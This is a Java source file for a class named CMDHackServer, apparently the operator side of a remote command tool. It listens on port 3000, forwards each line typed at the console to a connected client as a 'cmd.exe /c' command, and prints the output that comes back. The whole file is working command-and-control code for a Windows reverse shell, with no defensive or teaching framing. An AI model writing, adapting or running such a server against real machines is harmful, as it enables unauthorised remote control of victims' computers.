package com.github.jasgo.cmd.server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class CMDHackServer extends Thread {

    public static ServerSocket server;
    public static Socket socket;

    @Override
    public void run() {
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        try {
            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true, StandardCharsets.UTF_8);
            String line;
            while ((line = reader.readLine()) != null) {
                writer.println("cmd.exe /c " + line);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            server = new ServerSocket(3000);
            while (true) {
                socket = server.accept();
                Thread thread = new CMDHackServer();
                thread.start();
                new ListeningThread().start();
            }
        } catch (IOException e) {
            System.out.println("사용자와 접속이 끊어졌습니다.");
        }
    }
    public static class ListeningThread extends Thread {
        @Override
        public void run() {
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));
                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}
